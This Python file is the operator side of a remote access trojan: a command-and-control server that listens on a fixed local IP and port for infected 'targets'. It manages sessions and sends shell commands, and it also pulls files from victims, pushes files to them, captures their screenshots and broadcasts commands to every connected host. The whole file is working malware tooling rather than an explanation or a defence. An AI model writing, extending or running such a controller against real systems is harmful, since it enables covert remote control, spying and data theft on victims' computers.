#!/usr/bin/env python

import socket
import threading
import base64
import json
import os
from termcolor import colored

count = 0

def reliable_send_command_to_all(target, data):
    if target:
        json_data = json.dumps(data)
        target.send(json_data.encode())

def shell(target, ip):
    def reliable_send(data):
        if target:
            json_data = json.dumps(data)
            target.send(json_data.encode())

    def reliable_recv():
        data = b""
        while True:
            try:
                chunk = target.recv(1024)
                data += chunk
                return json.loads(data.decode())
            except ValueError:
                continue

    global count
    while True:
        command = input(colored(f">>> Shell#~{str(ip)}:", "green"))
        reliable_send(command)
        if command.strip() == "q" or command.strip() == "quit" or command.strip() == "exit":
            print(colored("[-] Closing connection...", "red"))
            break

        elif command == "exit":
            target.close()
            targets.remove(target)
            ip_addresses.remove(ip)
            break

        elif command[:2] == "cd" and len(command) > 2:
            cmd_result = reliable_recv()
            print(cmd_result)
            continue

        elif command[:8] == "download":
            file_path = command[9:]
            with open(file_path, "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
                print(f"Downloaded {file_path}")

        elif command[:6] == "upload":
            file_path = command[7:]
            try:
                with open(file_path, "rb") as file:
                    file_data = file.read()
                    file_data_encoded = base64.b64encode(file_data).decode()
                    reliable_send(file_data_encoded)
                    print(f"Uploaded {file_path}")
            except FileNotFoundError:
                print(f"File {file_path} not found")

        elif command[:10] == "screenshot":
            with open(f"screenshot{count}.png", "wb") as screen_shot:
                image = reliable_recv()
                try:
                    image_decoded = base64.b64decode(image)
                    if image_decoded[:4] == b"[!!]":
                        print(image_decoded.decode())
                    else:
                        screen_shot.write(image_decoded)
                    count += 1
                except base64.binascii.Error:
                    print("Invalid base64-encoded image data received.")

        else:
            cmd_result = reliable_recv()
            print(colored(cmd_result, "red"))


def server():
    global clients
    while True:
        if stop_thread:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ip_addresses.append(ip)
            print(str(ip_addresses[clients][0]) + " Port: " + str(ip_addresses[clients][1]) + " HAS CONNECTED")
            clients += 1
        except:
            pass


global sock
ip_addresses = []
targets = []

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("192.168.30.144", 5555))
sock.listen(5)

clients = 0
stop_thread = False

print(colored("[+] Waiting For Targets To Connect ...", "red"))
t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input(colored("[+] Control And Command Center: \n", "green"))
    if command == "targets":
        count = 0
        for ip_address in ip_addresses:
            print("Sessions " + str(count) + " <--> IP: " + str(ip_address[0]) + " Port: " + str(ip_address[1]))
            count += 1
    elif command[:7] == "session":
        try:
            session_number = int(command[8:])  # Convert session_number to integer
            target_number = targets[session_number]
            target_ip = ip_addresses[session_number]
            shell(target_number, target_ip)
        except:
            print("[!!] No Session Under This IP ADDRESS")
    elif command == "exit":
        for target in targets:
            target.close()
        sock.close()
        stop_thread = True
        t1.join()
        break
    elif command[:7] == "sendall":
        len_of_targets = len(targets)
        counter = 0
        try:
            while counter < len_of_targets:
                target_number = targets[counter]
                print(target_number)
                reliable_send_command_to_all(target_number, command)
                counter += 1
        except:
            print("[!!] Failed To Send Command To All Targets")
    else:
        print(colored("[!!] Command Doesn't Exist !!!", "red"))
